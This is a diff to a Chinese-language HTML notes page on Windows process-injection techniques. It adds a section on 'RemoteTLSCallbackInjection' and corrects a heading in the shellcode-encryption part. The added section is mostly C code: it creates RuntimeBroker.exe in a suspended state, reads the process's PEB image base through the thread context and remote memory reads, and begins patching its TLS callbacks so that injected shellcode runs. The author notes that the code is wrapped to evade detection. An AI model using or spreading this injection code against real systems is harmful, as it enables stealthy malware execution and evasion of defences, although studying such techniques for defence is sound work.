@@ -58,9 +58,10 @@
               {title: "DllNotificationInjection(2023/8)", url: "#dllnotificationinjection20238" },
               {title: "NtSetInformationProcess(2023-10)", url: "#ntsetinformationprocess2023-10" },
               {title: "PoolParty(2023-12)", url: "#poolparty2023-12" },
+              {title: "RemoteTLSCallbackInjection", url: "#remotetlscallbackinjection" },
           ]},
           {title: "Shellcode\u52a0\u89e3\u5bc6", url: "#shellcode_2", children: [
-              {title: "\u4ea6\u6216", url: "#_6" },
+              {title: "\u5f02\u6216", url: "#_6" },
               {title: "\u81ea\u5b9a\u4e49RC4", url: "#rc4" },
               {title: "AES", url: "#aes" },
               {title: "\u81ea\u5b9a\u4e49AES", url: "#aes_1" },
@@ -1384,10 +1385,81 @@ windows上64位的程序调用约定是fastcall，在将要传入<code>WriteProc
 向TP_DIRECT插入任务队列
 向TP_TIMER插入任务队列</p>
 <p><img alt="" src="../../images/Snipaste_2023-12-12_17-55-16.jpg" /></p>
+<h2 id="remotetlscallbackinjection">RemoteTLSCallbackInjection</h2>
+<p>https://github.com/Maldev-Academy/RemoteTLSCallbackInjection</p>
+<p>由<code>TheardlessInjection</code>衍生而来，patch目标进程的TLS回调函数来执行shellcode。</p>
+<p><img alt="" src="../../images/Snipaste_2024-01-23_11-18-58.jpg" /></p>
+<p>1、创建进程
+自定义函数<code>CreateProcessViaWinAPIsW</code>创建进程并设置为<code>SUSPENDED</code>状态</p>
+<pre><code class="language-c">    PROCESS_INFORMATION ProcessInfo     = { 0x00 };
+    WCHAR           szProcessName[]     = L&quot;C:\\Windows\\System32\\RuntimeBroker.exe -Embedding&quot;;
+
+    // Create a suspended process
+    if (!CreateProcessViaWinAPIsW(szProcessName, CREATE_SUSPENDED, &amp;ProcessInfo)) {
+        return -1;
+    }
+
+    if (!ProcessInfo.hProcess || !ProcessInfo.hThread)
+        return -1;
+</code></pre>
+<p>其实使用的<code>CreateProcessW()</code>函数来创建的进程，为什么要套娃一层，可能是为了程序逻辑复杂化躲避检测。</p>
+<pre><code class="language-C">BOOL CreateProcessViaWinAPIsW(IN LPWSTR szProcessImgNameAndParms, IN OPTIONAL DWORD dwFlags, OUT PPROCESS_INFORMATION pProcessInfo) {
+
+    if (!szProcessImgNameAndParms || !pProcessInfo)
+        return FALSE;
+
+    STARTUPINFOW        StartupInfo     = { .cb = sizeof(STARTUPINFOW) };
+    DWORD           dwCreationFlags     = dwFlags;
+
+    RtlSecureZeroMemory(pProcessInfo, sizeof(PROCESS_INFORMATION)); //初始化进程句柄内存
+
+    if (!CreateProcessW(NULL, szProcessImgNameAndParms, NULL, NULL, FALSE, dwCreationFlags, NULL, NULL, &amp;StartupInfo, pProcessInfo)) {
+        printf(&quot;[!] CreateProcessW Failed with Error: %d \n&quot;, GetLastError());
+        return FALSE;
+    }
+
+    return TRUE;
+} 
+</code></pre>
+<p>2、修改目标进程的TLS回调函数</p>
+<p>自定义函数<code>ChangeRemoteTLSCallbackArray()</code></p>
+<pre><code class="language-C">    if (!ChangeRemoteTLSCallbackArray(ProcessInfo.hProcess, ProcessInfo.hThread, rawData, sizeof(rawData))) {
+        TerminateProcess(ProcessInfo.hProcess, 0);
+        return -1;
+    }
+</code></pre>
+<p>获取线程上下文，<code>Context</code>结构体中<code>rdx</code>的值加上<code>Reserved3[1]</code>成员在PEB的偏移量，读取并保存到了<code>uImageBase</code>
+这样获取<code>ImageBaseAddress</code>的方式比较独特</p>
+<pre><code class="language-C">
+    if (!GetThreadContext(hThread, &amp;ThreadContext)) {
+        printf (&quot;[!] GetThreadContext Failed With Error: %d\n&quot;, GetLastError());
+        return FALSE;
+    }
+
+    printf(&quot;[i] PPEB Address: 0x%p \n&quot;, (void*)ThreadContext.Rdx);
+    printf(&quot;[i] Calculated Image Base Address To Be At: 0x%p \n&quot;, (void*)(ThreadContext.Rdx + offsetof(PEB, Reserved3[1])));
+
+    if (!ReadProcessMemory(hProcess, (PVOID)(ThreadContext.Rdx + offsetof(PEB, Reserved3[1])), &amp;uImageBase, sizeof(PVOID), NULL)) {
+        printf(&quot;[!] ReadProcessMemory [%d] Failed With Error: %d\n&quot;, __LINE__, GetLastError());
+        return FALSE;
+    }
+
+    printf(&quot;[*] Image Base Address: 0x%p \n&quot;, (void*)uImageBase);
+</code></pre>
+<pre><code class="language-C">    if (!(uImageBaseBuffer = LocalAlloc(LPTR, 0x1000))) {
+        printf(&quot;[i] LocalAlloc [%d] Failed With Error: %d \n&quot;, __LINE__, GetLastError());
+        return FALSE;
+    }
+
+    if (!ReadProcessMemory(hProcess, (PVOID)uImageBase, uImageBaseBuffer, 0x1000, NULL)) {
+        printf(&quot;[!] ReadProcessMemory [%d] Failed With Error: %d\n&quot;, __LINE__, GetLastError());
+        goto _END_OF_FUNC;
+    }
+</code></pre>
 <h1 id="shellcode_2">Shellcode加解密</h1>
 <p>安装openssl库
 <code>https://slproweb.com/products/Win32OpenSSL.html</code></p>
-<h2 id="_6">亦或</h2>
+<h2 id="_6">异或</h2>
 <pre><code class="language-C">加密
 #define KEY 0x01     //进行亦或的字符
 
